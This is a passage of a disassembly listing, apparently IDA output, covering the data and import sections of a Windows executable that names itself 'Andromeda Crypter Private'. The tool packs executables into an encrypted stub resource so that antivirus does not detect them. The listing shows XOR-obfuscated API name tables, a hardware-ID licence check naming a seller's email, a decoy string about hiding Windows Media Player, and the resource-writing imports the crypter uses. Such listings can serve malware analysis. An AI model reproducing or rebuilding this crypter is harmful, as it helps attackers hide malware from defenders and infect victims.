		dd 2			; Info.Id
		dd offset sub_40A774	; Info.Proc
		dd 3			; Info.Id
		dd offset sub_40A780	; Info.Proc
		dd 4			; Info.Id
		dd offset sub_40A78C	; Info.Proc
		dd 5			; Info.Id
		dd offset sub_40A798	; Info.Proc
		dd 6			; Info.Id
		dd offset sub_40A7A4	; Info.Proc
		dd 7			; Info.Id
		dd offset sub_40A7B0	; Info.Proc
		align 1000h
_rdata		ends

; Section 3. (virtual address 0000D000)
; Virtual size			: 000024FC (   9468.)
; Section size in file		: 00002000 (   8192.)
; Offset to raw	data for section: 0000D000
; Flags	C0000040: Data Readable	Writable
; Alignment	: default
; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read/Write
_data		segment	para public 'DATA' use32
		assume cs:_data
		;org 40D000h
dword_40D000	dd 41h dup(0)		; DATA XREF: __cinit+1Fo
		dd offset unknown_libname_11 ; MFC 3.1-10.0 32bit
		dd 40h dup(0)
dword_40D208	dd 41h dup(0)		; DATA XREF: __cinit+1Ao
dword_40D30C	dd 41h dup(0)		; DATA XREF: __cinit+10o
		dd offset ___initmbctable
		dd 40h dup(0)
		dd offset sub_40776B
		dd 40h dup(0)
dword_40D618	dd 41h dup(0)		; DATA XREF: __cinit:loc_406853o
dword_40D71C	dd 41h dup(0)		; DATA XREF: _doexit+65o
dword_40D820	dd 41h dup(0)		; DATA XREF: _doexit:loc_406915o
dword_40D924	dd 41h dup(0)		; DATA XREF: _doexit+76o
		dd offset sub_40777C
		dd 40h dup(0)
dword_40DB2C	dd 41h dup(0)		; DATA XREF: _doexit:loc_406926o
; char String[]
String		db 'This program was created in using pure Win32 API (in C++). The pu'
					; DATA XREF: sub_40114A:loc_401199o
		db 'rpose of this program is to save both screen memory and taskbar s'
		db 'pace by hiding the Windows Media Player Window.',0
		align 4
		dd 9 dup(0)
dword_40DD08	dd 1B130319h, 1B13591Bh, 771Bh ; DATA XREF: sub_401A04+104o
dword_40DD14	dd 1905121Ch, 45441B12h, 1B1B1359h, 77h	; DATA XREF: sub_401A04+113o
dword_40DD24	dd 3A031230h, 1B021318h, 19163F12h, 36121B13h, 77h
					; DATA XREF: sub_401A04+122o
					; sub_401A04+1AEo
dword_40DD38	dd 27031230h, 36141805h, 12051313h, 770404h ; DATA XREF: sub_401A04+131o
					; sub_401A04+1CCo
dword_40DD48	dd 16120534h, 5271203h,	4121418h, 773604h ; DATA XREF: sub_401A04+140o
					; sub_401A04+1E7o
dword_40DD58	dd 19220339h, 2107161Ah, 3800121Eh, 14122411h, 19181E03h
					; DATA XREF: sub_401A04+14Fo
					; sub_401A04+202o
		dd 77h
dword_40DD70	dd 3051E21h, 361B1602h,	14181B1Bh, 770F32h ; DATA XREF:	sub_401A04+15Eo
					; sub_401A04+21Do
dword_40DD80	dd 31E0520h, 18052712h,	4041214h, 181A123Ah, 770E05h
					; DATA XREF: sub_401A04+16Do
					; sub_401A04+238o
dword_40DD94	dd 23031230h, 1612051Fh, 19183413h, 30F1203h, 77h
					; DATA XREF: sub_401A04+17Co
					; sub_401A04+253o
dword_40DDA8	dd 23031224h, 1612051Fh, 19183413h, 30F1203h, 77h
					; DATA XREF: sub_401A04+18Bo
					; sub_401A04+26Eo
dword_40DDBC	dd 2041225h, 1F23121Ah,	13161205h, 77h ; DATA XREF: sub_401A04+19Ao
					; sub_401A04+289o
dword_40DDCC	dd 16120534h, 23A1203h,	360F1203h, 77h ; DATA XREF: _WinMain@16_0+56o
					; _WinMain@16_0+103o
dword_40DDDC	dd 19120738h, 1203023Ah, 77360Fh ; DATA	XREF: _WinMain@16_0+47o
					; _WinMain@16_0+ECo
dword_40DDE8	dd 3A031230h, 1B021318h, 1B1E3112h, 1A163912h, 773612h
					; DATA XREF: _WinMain@16_0+65o
					; _WinMain@16_0+79o
dword_40DDFC	dd 120D1E24h, 12251118h, 5021804h, 771214h ; DATA XREF:	_WinMain@16_0+Bo
					; _WinMain@16_0+90o
dword_40DE0C	dd 1316183Bh, 18041225h, 12140502h, 77h	; DATA XREF: _WinMain@16_0+1Ao
					; _WinMain@16_0+A7o
dword_40DE1C	dd 13191E31h, 18041225h, 12140502h, 7736h ; DATA XREF: _WinMain@16_0+29o
					; _WinMain@16_0+BEo
dword_40DE2C	dd 1C14183Bh, 18041225h, 12140502h, 77h	; DATA XREF: _WinMain@16_0+38o
					; _WinMain@16_0+D5o
aKernel32_dll_6	db 'kernel32.dll',0     ; DATA XREF: sub_401A04+1A9o
		align 4
aKernel32_dll_7	db 'kernel32.dll',0     ; DATA XREF: sub_401A04+1C7o
		align 4
aKernel32_dll_8	db 'kernel32.dll',0     ; DATA XREF: sub_401A04+1E2o
		align 4
aNtdll_dll	db 'ntdll.dll',0        ; DATA XREF: sub_401A04+1FDo
		align 4
aKernel32_dll_9	db 'kernel32.dll',0     ; DATA XREF: sub_401A04+218o
		align 4
aKernel32_dl_10	db 'kernel32.dll',0     ; DATA XREF: sub_401A04+233o
		align 4
aKernel32_dl_11	db 'kernel32.dll',0     ; DATA XREF: sub_401A04+24Eo
		align 4
aKernel32_dl_12	db 'kernel32.dll',0     ; DATA XREF: sub_401A04+269o
		align 4
aKernel32_dl_13	db 'kernel32.dll',0     ; DATA XREF: sub_401A04+284o
		align 4
aKernel32_dll	db 'kernel32.dll',0     ; DATA XREF: _WinMain@16_0+74o
		align 4
aKernel32_dll_0	db 'kernel32.dll',0     ; DATA XREF: _WinMain@16_0+8Bo
		align 4
aKernel32_dll_1	db 'kernel32.dll',0     ; DATA XREF: _WinMain@16_0+A2o
		align 4
aKernel32_dll_2	db 'kernel32.dll',0     ; DATA XREF: _WinMain@16_0+B9o
		align 4
aKernel32_dll_3	db 'kernel32.dll',0     ; DATA XREF: _WinMain@16_0+D0o
		align 4
aKernel32_dll_4	db 'kernel32.dll',0     ; DATA XREF: _WinMain@16_0+E7o
		align 4
aKernel32_dll_5	db 'kernel32.dll',0     ; DATA XREF: _WinMain@16_0+FEo
		align 4
; char Caption[]
Caption		db 'Andromeda Crypter Private',0 ; DATA XREF: sub_4024F1+1B2o
		align 4
; char Text[]
Text		db 'Could not load file!',0 ; DATA XREF: sub_4024F1+1B7o
		align 4
; char aAndromedaCry_0[]
aAndromedaCry_0	db 'Andromeda Crypter Private',0 ; DATA XREF: sub_4024F1+348o
		align 4
; char aCouldNotLoad_0[]
aCouldNotLoad_0	db 'Could not load file!',0 ; DATA XREF: sub_4024F1+34Do
		align 10h
aStub		db 'STUB',0
		align 4
aAndromedaCr_13	db 'Andromeda Crypter Private',0
		align 4
aCouldNotFindRe	db 'Could not find resource!',0
		align 10h
aAndromedaCr_14	db 'Andromeda Crypter Private',0
		align 4
aCouldNotLoadRe	db 'Could not load resource!',0
		align 4
aAndromedaCr_15	db 'Andromeda Crypter Private',0
		align 4
aCouldNotLockRe	db 'Could not lock resource!',0
		align 10h
a_bak		db '.bak',0
		align 4
aAndromedaCr_16	db 'Andromeda Crypter Private',0
		align 4
aCouldNotCopyFi	db 'Could not copy file!',0
		align 4
; char aAndromedaCrypt[]
aAndromedaCrypt	db 'Andromeda Crypter Private',0 ; DATA XREF: sub_4024F1+3EAo
		align 4
; char aCouldNotCreate[]
aCouldNotCreate	db 'Could not create file!',0 ; DATA XREF: sub_4024F1+3EFo
		align 10h
; char aAndromedaCry_1[]
aAndromedaCry_1	db 'Andromeda Crypter Private',0 ; DATA XREF: sub_4024F1+44Ao
		align 4
; char aCouldNotWriteT[]
aCouldNotWriteT	db 'Could not write to file!',0 ; DATA XREF: sub_4024F1+44Fo
		align 4
; char aAndromedaCry_2[]
aAndromedaCry_2	db 'Andromeda Crypter Private',0 ; DATA XREF: sub_4024F1+4B5o
		align 4
; char aCouldNotAddIco[]
aCouldNotAddIco	db 'Could not add icon!',0 ; DATA XREF: sub_4024F1+4BAo
; char aAndromedaCry_3[]
aAndromedaCry_3	db 'Andromeda Crypter Private',0 ; DATA XREF: sub_4024F1+4F9o
		align 4
; char aCouldNotAddRes[]
aCouldNotAddRes	db 'Could not add resource!',0 ; DATA XREF: sub_4024F1+4FEo
; char aAndromedaCry_4[]
aAndromedaCry_4	db 'Andromeda Crypter Private',0 ; DATA XREF: sub_4024F1+562o
		align 4
; char aCouldNotAddR_0[]
aCouldNotAddR_0	db 'Could not add resource!',0 ; DATA XREF: sub_4024F1+567o
; char aAndromedaCry_5[]
aAndromedaCry_5	db 'Andromeda Crypter Private',0 ; DATA XREF: sub_4024F1+5ADo
		align 4
; char aCouldNotAddR_1[]
aCouldNotAddR_1	db 'Could not add resource!',0 ; DATA XREF: sub_4024F1+5B2o
; char aAndromedaCry_6[]
aAndromedaCry_6	db 'Andromeda Crypter Private',0 ; DATA XREF: sub_4024F1+5F8o
		align 10h
; char aCouldNotAddR_2[]
aCouldNotAddR_2	db 'Could not add resource!',0 ; DATA XREF: sub_4024F1+5FDo
; char aAndromedaCry_7[]
aAndromedaCry_7	db 'Andromeda Crypter Private',0 ; DATA XREF: sub_4024F1+643o
		align 4
; char aCouldNotAddR_3[]
aCouldNotAddR_3	db 'Could not add resource!',0 ; DATA XREF: sub_4024F1+648o
; char aAndromedaCry_8[]
aAndromedaCry_8	db 'Andromeda Crypter Private',0 ; DATA XREF: sub_4024F1+681o
		align 4
; char aCouldAddResour[]
aCouldAddResour	db 'Could add resource!',0 ; DATA XREF: sub_4024F1+686o
; char aAndromedaCry_9[]
aAndromedaCry_9	db 'Andromeda Crypter Private',0 ; DATA XREF: sub_4024F1+715o
		align 4
; char aEofDataFound[]
aEofDataFound	db 'EOF data found!',0  ; DATA XREF: sub_4024F1+71Ao
; char aAndromedaCr_10[]
aAndromedaCr_10	db 'Andromeda Crypter Private',0 ; DATA XREF: sub_4024F1+74Eo
		align 4
; char aCouldNotOpenFi[]
aCouldNotOpenFi	db 'Could not open file!',0 ; DATA XREF: sub_4024F1+753o
		align 4
; char aAndromedaCr_11[]
aAndromedaCr_11	db 'Andromeda Crypter Private',0 ; DATA XREF: sub_4024F1+7DFo
		align 4
; char aCouldNotWrit_0[]
aCouldNotWrit_0	db 'Could not write to file!',0 ; DATA XREF: sub_4024F1+7E4o
		align 4
; char aAndromedaCr_12[]
aAndromedaCr_12	db 'Andromeda Crypter Private',0 ; DATA XREF: sub_4024F1+814o
		align 10h
; char aFileSuccessful[]
aFileSuccessful	db 'File successfully crypted!',0 ; DATA XREF: sub_4024F1+819o
		align 4
aAbout		db 'About',0
		align 4
aAndromedaCr_17	db 'Andromeda Crypter Private',0
		align 10h
aM_aerocrypter	db 'm_Aerocrypter',0    ; DATA XREF: .text:00402D38o
		align 10h
aM_aerocrypte_0	db 'm_Aerocrypter',0    ; DATA XREF: .text:00402D59o
		align 10h
aHomedrive	db 'HOMEDRIVE',0        ; DATA XREF: .text:00402D83o
		align 4
asc_40E37C	db '\',0                ; DATA XREF: .text:00402D8Eo
		align 10h
aHwid		db 'HWID',0             ; DATA XREF: .text:00402DC8o
		align 4
aCannotGetTheHw	db 'Cannot get the HWID',0 ; DATA XREF: .text:00402DCDo
aThankYou	db 'Thank You ',0       ; DATA XREF: .text:00402DEFo
		align 4
aHardwareIdChec	db 'Hardware ID checked!. Acces Granted',0 ; DATA XREF: .text:00402DF4o
aAccessDenied	db 'Access DENIED',0    ; DATA XREF: .text:00402E28o
		align 4
aHardwareIdCh_0	db 'Hardware ID checked, Acces DENIED! If you want to use this crypte'
					; DATA XREF: .text:00402E2Do
		db 'r please buy from alex220247@hotmail.com',0
		align 4
		dd 5Eh dup(0)
dword_40E5C0	dd 19930520h, 3	dup(0)	; DATA XREF: __NLG_Notify1+2o
					; __NLG_Notify+2o
dword_40E5D0	dd 1			; DATA XREF: .text:00404952w _randr ...
		align 10h
off_40E5E0	dd offset __exit	; DATA XREF: __amsg_exit+1Cr
dword_40E5E4	dd 2			; DATA XREF: __FF_MSGBANNER+Er
					; __NMSG_WRITE+46r
		dd 10h
dword_40E5EC	dd 3F8h			; DATA XREF: _realloc+4Dr
					; __heap_alloc+5r ...
		dd offset ?__CxxUnhandledExceptionFilter@@YGJPAU_EXCEPTION_POINTERS@@@Z	; __CxxUnhandledExceptionFilter(_EXCEPTION_POINTERS *)
		align 10h
off_40E600	dd offset sub_40678C	; DATA XREF: unexpected(void)r
off_40E604	dd offset sub_40678C	; DATA XREF: sub_4067F2+29r
dword_40E608	dd 0C0000005h		; DATA XREF: _xcptlookup+Ar
					; _xcptlookup+11o ...
dword_40E60C	dd 0Bh			; DATA XREF: _siglookup+Ar
		dd 0
		dd 0C000001Dh, 4, 0
		dd 0C0000096h, 4, 0
		dd 0C000008Dh, 8, 0
		dd 0C000008Eh, 8, 0
		dd 0C000008Fh, 8, 0
		dd 0C0000090h, 8, 0
		dd 0C0000091h, 8, 0
		dd 0C0000092h, 8, 0
		dd 0C0000093h, 8, 0
dword_40E680	dd 3			; DATA XREF: __XcptFilter+58r
					; _raise+C8r
dword_40E684	dd 7			; DATA XREF: __XcptFilter+5Er
					; _raise+CDr
dword_40E688	dd 0Ah			; DATA XREF: _xcptlookup+4r
					; _signal+5Er ...
dword_40E68C	dd 8Ch			; DATA XREF: __XcptFilter+82r
					; __XcptFilter+8Fw ...
		dd 0FFFFFFFFh, 0A00h
dword_40E698	dd 2			; DATA XREF: __NMSG_WRITE+Eo
					; __NMSG_WRITE+28r ...
off_40E69C	dd offset aR6002FloatingP ; DATA XREF: __NMSG_WRITE+FCr
					; __NMSG_WRITE+12Do ...
					; "R6002\r\n- floating point not loaded\r\n"
		dd 8, 40C3F8h, 9, 40C3CCh, 0Ah,	40C3A8h, 10h, 40C37Ch
		dd 11h,	40C34Ch, 12h, 40C328h, 13h, 40C2FCh, 18h, 40C2C4h
		dd 19h,	40C29Ch, 1Ah, 40C264h, 1Bh, 40C22Ch, 1Ch, 40C204h
		dd 78h,	40C1F4h, 79h, 40C1E4h, 7Ah, 40C1D4h, 0FCh, 40C1D0h
		dd 0FFh, 40C1C0h
dword_40E728	dd 2 dup(0)		; DATA XREF: __NMSG_WRITE+1Bo
					; .text:004073CBo
byte_40E730	db 1			; DATA XREF: __setmbcp+E1r
		db 2, 4, 8
		align 8
dword_40E738	dd 3A4h			; DATA XREF: __setmbcp+2Fo
aVyv		db '`y!',0            ; DATA XREF: __setmbcp+11Do
		align 8
aJ		db '',0               ; DATA XREF: __setmbcp+C0o
		align 10h
aBe		db '',0
		align 8
		dd 0FCE09F81h, 0
		dd 0FC807E40h, 0
		dd 3A8h, 0A3DAA3C1h, 20h, 5 dup(0)
		dd 0FE81h, 0
		dd 0FE40h, 0
		dd 3B5h, 0A3DAA3C1h, 20h, 5 dup(0)
		dd 0FE81h, 0
		dd 0FE41h, 0
		dd 3B6h, 0A2E4A2CFh, 0A2E5001Ah, 5BA2E8h, 4 dup(0)
		dd 0FE81h, 0
		dd 0FEA17E40h, 0
		dd 551h, 0DA5EDA51h, 0DA5F0020h, 32DA6Ah, 4 dup(0)
		dd 0DED8D381h, 0F9E0h, 0FE817E31h, 0
dword_40E828	dd 2 dup(0)		; DATA XREF: __setmbcp+3Co
		dd offset __ctype+2
		dd offset __ctype+2
		public __ctype
__ctype		dd    200000h		; DATA XREF: _x_ismbbtype+18r
					; .data:0040E830o ...
		unicode	0, <	    (((((		   H>
		dd 7 dup(100010h), 840010h, 4 dup(840084h), 100084h, 3 dup(100010h)
		dd 3 dup(810081h), 0Ah dup(10001h), 3 dup(100010h), 3 dup(820082h)
		dd 0Ah dup(20002h), 2 dup(100010h), 20h, 0BCh dup(0)
; LPVOID lpBuffer
lpBuffer	dd 0			; DATA XREF: sub_4012FC+57r
					; sub_4012FC+65w ...
; DWORD	nNumberOfBytesToRead
nNumberOfBytesToRead dd	0		; DATA XREF: sub_4012FC+3Bw
					; sub_4012FC+40r ...
		align 8
; const	CHAR byte_40EC38
byte_40EC38	db 0			; DATA XREF: sub_4024F1:loc_402690o
					; sub_4024F1:loc_4026C1o ...
		align 4
		dd 41h dup(0)
dword_40ED40	dd 0			; DATA XREF: sub_4012FC+A6w
					; sub_4012FC+ABr ...
; LPARAM lParam
lParam		dd 0			; DATA XREF: sub_4024F1+BEw
					; sub_4024F1+C3r ...
dword_40ED48	dd 0			; DATA XREF: sub_4012FC+DFw
					; sub_4012FC+E5r ...
dword_40ED4C	dd 0			; DATA XREF: sub_401A04+39Dw
					; sub_401A04+3A5r ...
byte_40ED50	db 0			; DATA XREF: sub_4024F1+2A9w
					; sub_4024F1+4A2o
		align 4
		dd 42h dup(0)
; HINSTANCE hInstance
hInstance	dd 0			; DATA XREF: sub_4024F1+B1r
					; sub_4024F1+107r ...
dword_40EE60	dd 0			; DATA XREF: __initp_eh_hooks+10w
					; sub_401251+27r
		dd 20h dup(0)
; char *dword_40EEE4
dword_40EEE4	dd 0			; DATA XREF: start+84w
					; __setenvp:loc_406B56r ...
		dd 0
dword_40EEEC	dd 0			; DATA XREF: __amsg_exitr
					; _fast_error_exitr ...
dword_40EEF0	dd 0			; DATA XREF: .text:00405F0Er
					; .text:00405F13w ...
dword_40EEF4	dd 0			; DATA XREF: _realloc:loc_404466r
					; _mallocr
; void *lp
lp		dd 0			; DATA XREF: FindHandler(EHExceptionRecord *,EHRegistrationNode	*,_CONTEXT *,void *,_s_FuncInfo	const *,uchar,int,EHRegistrationNode *)+4Er
					; CallCatchBlock(EHExceptionRecord *,EHRegistrationNode	*,_CONTEXT *,_s_FuncInfo const *,void *,int,ulong)+3Ar	...
dword_40EEFC	dd 0			; DATA XREF: FindHandler(EHExceptionRecord *,EHRegistrationNode	*,_CONTEXT *,void *,_s_FuncInfo	const *,uchar,int,EHRegistrationNode *)+5Cr
					; CallCatchBlock(EHExceptionRecord *,EHRegistrationNode	*,_CONTEXT *,_s_FuncInfo const *,void *,int,ulong)+43r	...
dword_40EF00	dd 0			; DATA XREF: _CallSETranslator(EHExceptionRecord *,EHRegistrationNode *,void *,void *,_s_FuncInfo const	*,int,EHRegistrationNode *)+7Ar
					; FindHandlerForForeignException(EHExceptionRecord *,EHRegistrationNode	*,_CONTEXT *,void *,_s_FuncInfo	const *,int,int,EHRegistrationNode *)+5r
dword_40EF04	dd 0			; DATA XREF: sub_40678C+29r
dword_40EF08	dd 0			; DATA XREF: _signal:loc_407FD8w
dword_40EF0C	dd 0			; DATA XREF: _signal+C5w
		dd 0
dword_40EF14	dd 0			; DATA XREF: start+52w
dword_40EF18	dd 0			; DATA XREF: start+49w
dword_40EF1C	dd 0			; DATA XREF: start+3Ew
dword_40EF20	dd 0			; DATA XREF: start+30w
dword_40EF24	dd 0			; DATA XREF: __setargv+91w
dword_40EF28	dd 0			; DATA XREF: __setargv+89w
		align 10h
dword_40EF30	dd 0			; DATA XREF: __setenvp+44w
		align 10h
dword_40EF40	dd 0			; DATA XREF: __setargv+2Ew
		align 8
byte_40EF48	db 0			; DATA XREF: _doexit+2Dw
		align 4
dword_40EF4C	dd 0			; DATA XREF: _doexit+27w
dword_40EF50	dd 0			; DATA XREF: _doexit+4r _doexit+8Bw
dword_40EF54	dd 0			; DATA XREF: __XcptFilter+3Ar
					; __XcptFilter+46w ...
; char Filename[168]
Filename	db 0A8h	dup(0)		; DATA XREF: __setargv:loc_406C14o
		dd 17h dup(?)
dword_40F05C	dd ?			; DATA XREF: ___crtGetEnvironmentStringsA+2r
					; ___crtGetEnvironmentStringsA+23w ...
dword_40F060	dd ?			; DATA XREF: __FF_MSGBANNER+21r
; LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter
lpTopLevelExceptionFilter dd ?		; DATA XREF: __CxxUnhandledExceptionFilter(_EXCEPTION_POINTERS *):loc_407748r
					; __CxxUnhandledExceptionFilter(_EXCEPTION_POINTERS *)+38r ...
dword_40F068	dd ?			; DATA XREF: __setmbcp:loc_407B04r
					; _getSystemCP+4w ...
dword_40F06C	dd ?			; DATA XREF: ___crtMessageBoxA+3r
					; ___crtMessageBoxA+2Ew ...
dword_40F070	dd ?			; DATA XREF: ___crtMessageBoxA+43w
					; ___crtMessageBoxA:loc_407DC8r
dword_40F074	dd ?			; DATA XREF: ___crtMessageBoxA+4Aw
					; ___crtMessageBoxA+60r
dword_40F078	dd ?			; DATA XREF: _signal:loc_408005r
					; _signal+FDw ...
dword_40F07C	dd ?			; DATA XREF: _signal:loc_407FE9r
					; _signal+E1w ...
dword_40F080	dd ?			; DATA XREF: _signal+B1r _signal+B7w ...
dword_40F084	dd ?			; DATA XREF: _signal:loc_407FF7r
					; _signal+EFw ...
dword_40F088	dd ?			; DATA XREF: _signal:loc_407F8Er
					; _signal+9Bw
		dd 2 dup(?)
dword_40F094	dd ?			; DATA XREF: ___crtGetStringTypeA+7Br
		dd 3 dup(?)
dword_40F0A4	dd ?			; DATA XREF: _getSystemCP+3Ar
					; ___crtLCMapStringA+C0r ...
		dd ?
dword_40F0AC	dd ?			; DATA XREF: ___crtLCMapStringA+28r
					; ___crtLCMapStringA+4Cw ...
dword_40F0B0	dd ?			; DATA XREF: ___crtGetStringTypeA+26r
					; ___crtGetStringTypeA:loc_40847Dw
; UINT CodePage
CodePage	dd ?			; DATA XREF: .text:__ismbbkanar
					; __setmbcp+14r ...
		dd 1Eh dup(?)
dword_40F130	dd 3 dup(?)		; DATA XREF: __setmbcp+123o
					; __setmbcp+171o ...
dword_40F13C	dd ?			; DATA XREF: __setmbcp+108w
					; __setmbcp+15Dw ...
byte_40F140	db ?			; DATA XREF: _setSBUpLow:loc_407CD4w
					; _setSBUpLow:loc_407CF1w ...
		align 4
		dd 3Fh dup(?)
byte_40F240	db ?			; DATA XREF: __setmbcp+5Co
					; __setmbcp+AFo ...
byte_40F241	db ?			; DATA XREF: _parse_cmdline+3Fr
					; _parse_cmdline+84r ...
		align 4
		dd 40h dup(?)
; LCID Locale
Locale		dd ?			; DATA XREF: __setmbcp+6Ew
					; __setmbcp+12Bw ...
		dd 6 dup(?)
dword_40F360	dd ?			; DATA XREF: __ioinit:loc_406F9Cw
					; __ioinit+45r	...
dword_40F364	dd 3Fh dup(?)		; DATA XREF: __ioinit+92o
dword_40F460	dd 0Fh dup(?)		; DATA XREF: .text:00407140o
; UINT uNumber
uNumber		dd ?			; DATA XREF: __ioinit+26w
					; __ioinit:loc_407006r	...
dword_40F4A0	dd ?			; DATA XREF: __setenvp+ADw
		align 10h
dword_40F4B0	dd ?			; DATA XREF: __wincmdlnr __setenvp+3r	...
dword_40F4B4	dd ?			; DATA XREF: _doexit+3Er
dword_40F4B8	dd ?			; DATA XREF: _doexit+35r _doexit+57r
dword_40F4BC	dd ?			; DATA XREF: __cinitr
dword_40F4C0	dd ?			; DATA XREF: ___sbh_heap_init+32w
					; ___sbh_alloc_new_region+5r ...
		align 10h
dword_40F4D0	dd ?			; DATA XREF: ___sbh_free_block+239r
					; ___sbh_free_block+259r ...
dword_40F4D4	dd ?			; DATA XREF: ___sbh_heap_init+2Dw
					; ___sbh_free_block+310w ...
; void *Dst
Dst		dd ?			; DATA XREF: ___sbh_heap_init:loc_404FE8w
					; ___sbh_free_block+22Cr ...
dword_40F4DC	dd ?			; DATA XREF: .text:00404F3Cr
					; .text:00404F85r ...
; LPVOID lpMem
lpMem		dd ?			; DATA XREF: .text:00404F4Br
					; .text:loc_404F8Fr ...
; HANDLE hHeap
hHeap		dd ?			; DATA XREF: _free+21r	_realloc+A9r ...
		align 10h
dword_40F4F0	dd ?			; DATA XREF: start+7Aw	__wincmdln+Fr ...
		align 1000h
_data		ends

;
; Imports from KERNEL32.dll
;
; Section 4. (virtual address 00010000)
; Virtual size			: 00000A59 (   2649.)
; Section size in file		: 00001000 (   4096.)
; Offset to raw	data for section: 0000F000
; Flags	C0000040: Data Readable	Writable
; Alignment	: default
; ===========================================================================

; Segment type:	Externs
; _idata
; HGLOBAL __stdcall LoadResource(HMODULE hModule, HRSRC	hResInfo)
		extrn LoadResource:dword ; CODE	XREF: sub_401251+99p
					; sub_4017BD+141p ...
; DWORD	__stdcall SizeofResource(HMODULE hModule, HRSRC	hResInfo)
		extrn SizeofResource:dword ; CODE XREF:	sub_401251+87p
					; sub_4017BD+12Cp ...
; DWORD	__stdcall GetModuleFileNameA(HMODULE hModule, LPCH lpFilename, DWORD nSize)
		extrn GetModuleFileNameA:dword ; CODE XREF: sub_401251+6Ep
					; sub_4017BD+10Bp ...
; BOOL __stdcall CloseHandle(HANDLE hObject)
		extrn CloseHandle:dword	; CODE XREF: sub_4012FC+9Bp
					; sub_40140A+260p ...
; BOOL __stdcall ReadFile(HANDLE hFile,	LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped)
		extrn ReadFile:dword	; CODE XREF: sub_4012FC+91p
					; sub_40140A+5Ap ...
; DWORD	__stdcall GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh)
		extrn GetFileSize:dword	; CODE XREF: sub_4012FC+35p
					; DATA XREF: sub_4012FC+35r ...
; HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD	dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,	DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE	hTemplateFile)
		extrn CreateFileA:dword	; CODE XREF: sub_4012FC+19p
					; sub_40140A+1Ap ...
; BOOL __stdcall EndUpdateResourceA(HANDLE hUpdate, BOOL fDiscard)
		extrn EndUpdateResourceA:dword ; CODE XREF: sub_40140A+39Bp
					; sub_4024F1+675p
					; DATA XREF: ...
; BOOL __stdcall UpdateResourceA(HANDLE	hUpdate, LPCSTR	lpType,	LPCSTR lpName, WORD wLanguage, LPVOID lpData, DWORD cb)
		extrn UpdateResourceA:dword ; CODE XREF: sub_40140A+32Ap
					; sub_40140A+387p ...
; DWORD	__stdcall SetFilePointer(HANDLE	hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod)
		extrn SetFilePointer:dword ; CODE XREF:	sub_40140A+2D7p
					; sub_4024F1+784p
					; DATA XREF: ...
; HANDLE __stdcall BeginUpdateResourceA(LPCSTR pFileName, BOOL bDeleteExistingResources)
		extrn BeginUpdateResourceA:dword ; CODE	XREF: sub_40140A+24Dp
					; sub_4024F1+4E8p
					; DATA XREF: ...
; HRSRC	__stdcall FindResourceA(HMODULE	hModule, LPCSTR	lpName,	LPCSTR lpType)
		extrn FindResourceA:dword ; CODE XREF: sub_4017BD+117p
					; sub_401A04+5Fp
					; DATA XREF: ...
; BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite,	LPDWORD	lpNumberOfBytesWritten,	LPOVERLAPPED lpOverlapped)
		extrn WriteFile:dword	; CODE XREF: sub_4024F1+428p
					; sub_4024F1+7C9p ...
; BOOL __stdcall GetVolumeInformationA(LPCSTR lpRootPathName, LPSTR lpVolumeNameBuffer,	DWORD nVolumeNameSize, LPDWORD lpVolumeSerialNumber, LPDWORD lpMaximumComponentLength, LPDWORD lpFileSystemFlags, LPSTR	lpFileSystemNameBuffer,	DWORD nFileSystemNameSize)
		extrn GetVolumeInformationA:dword ; CODE XREF: .text:00402DBCp
					; DATA XREF: .text:00402DBCr ...
; DWORD	__stdcall GetEnvironmentVariableA(LPCSTR lpName, LPSTR lpBuffer, DWORD nSize)
		extrn GetEnvironmentVariableA:dword ; CODE XREF: .text:00402D88p
					; DATA XREF: .text:00402D88r ...
; HANDLE __stdcall CreateMutexA(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName)
		extrn CreateMutexA:dword ; CODE	XREF: .text:00402D62p
					; DATA XREF: .text:00402D62r ...
; HANDLE __stdcall OpenMutexA(DWORD dwDesiredAccess, BOOL bInheritHandle, LPCSTR lpName)
		extrn OpenMutexA:dword	; CODE XREF: .text:00402D44p
					; DATA XREF: .text:00402D44r ...
; FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName)
		extrn GetProcAddress:dword ; CODE XREF:	sub_403550+4Ep
					; sub_403670+4Ep ...
; HMODULE __stdcall LoadLibraryA(LPCSTR	lpLibFileName)
		extrn LoadLibraryA:dword ; CODE	XREF: sub_403550+47p
					; sub_403670+47p ...
; BOOL __stdcall VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect)
		extrn VirtualProtect:dword ; CODE XREF:	sub_403550+39p
					; sub_403670+39p ...
; BOOL __stdcall GetStringTypeA(LCID Locale, DWORD dwInfoType, LPCSTR lpSrcStr,	int cchSrc, LPWORD lpCharType)
		extrn GetStringTypeA:dword ; CODE XREF:	___crtGetStringTypeA+59p
					; ___crtGetStringTypeA+8Dp
					; DATA XREF: ...
; int __stdcall	LCMapStringW(LCID Locale, DWORD	dwMapFlags, LPCWSTR lpSrcStr, int cchSrc, LPWSTR lpDestStr, int	cchDest)
		extrn LCMapStringW:dword ; CODE	XREF: ___crtLCMapStringA+42p
					; ___crtLCMapStringA+14Dp ...
; int __stdcall	LCMapStringA(LCID Locale, DWORD	dwMapFlags, LPCSTR lpSrcStr, int cchSrc, LPSTR lpDestStr, int cchDest)
		extrn LCMapStringA:dword ; CODE	XREF: ___crtLCMapStringA+5Ep
					; ___crtLCMapStringA+A7p
					; DATA XREF: ...
; int __stdcall	MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCSTR lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr,	int cchWideChar)
		extrn MultiByteToWideChar:dword	; CODE XREF: ___crtLCMapStringA+DFp
					; ___crtLCMapStringA+137p ...
; BOOL __stdcall SetConsoleCtrlHandler(PHANDLER_ROUTINE	HandlerRoutine,	BOOL Add)
